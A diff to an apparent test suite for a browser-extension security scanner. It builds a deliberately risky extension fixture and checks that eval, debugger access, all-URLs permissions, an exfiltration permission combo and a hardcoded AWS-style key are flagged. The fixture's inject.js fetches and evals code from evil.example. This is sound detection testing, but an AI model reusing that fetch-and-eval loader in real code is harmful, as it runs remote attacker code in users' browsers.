@@ -31,8 +31,9 @@ const sketchy = makeExt({
     permissions: ["tabs", "cookies", "history", "debugger", "management"],
     host_permissions: ["<all_urls>"],
     content_scripts: [{ matches: ["<all_urls>"], js: ["inject.js"], all_frames: true }],
+    web_accessible_resources: [{ resources: ["injected.js"], matches: ["<all_urls>"] }],
   }),
-  "inject.js": "const f = fetch('https://evil.example/x.js'); eval(f); document.body.innerHTML = 'hi';",
+  "inject.js": "const f = fetch('https://evil.example/x.js'); eval(f); document.body.innerHTML = 'hi';\nconst KEY = 'AKIAIOSFODNN7EXAMPLE';",
 });
 
 let failed = 0;
@@ -49,6 +50,9 @@ check(`sketchy ext scores CRITICAL (got ${r2.band} ${r2.score})`, r2.band === "C
 check("eval flagged", r2.findings.some((f) => f.code === "CODE_EVAL"));
 check("debugger flagged", r2.findings.some((f) => f.code === "PERM_DEBUGGER"));
 check("all_urls host flagged", r2.findings.some((f) => f.code === "HOST_ALL_URLS"));
+check("permission combo flagged", r2.findings.some((f) => f.code === "COMBO_DATA_EXFIL"));
+check("hardcoded AWS key flagged", r2.findings.some((f) => f.code === "SECRET_AWS_KEY"));
+check("web-accessible resources flagged", r2.findings.some((f) => f.code === "WAR_ALL_URLS"));
 
 fs.rmSync(clean, { recursive: true, force: true });
 fs.rmSync(sketchy, { recursive: true, force: true });
